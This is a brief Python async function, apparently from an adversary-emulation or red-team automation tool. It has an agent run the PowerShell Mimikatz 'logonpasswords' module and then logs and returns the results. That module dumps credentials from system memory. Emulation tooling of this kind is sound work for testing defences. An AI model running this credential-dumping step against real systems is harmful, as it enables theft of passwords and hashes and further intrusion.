
async def crystallize(agent):
    output = await agent.execute(
        "powershell/credentials/mimikatz/logonpasswords"
    )

    results = output["results"]
    log.debug(results)
    return results
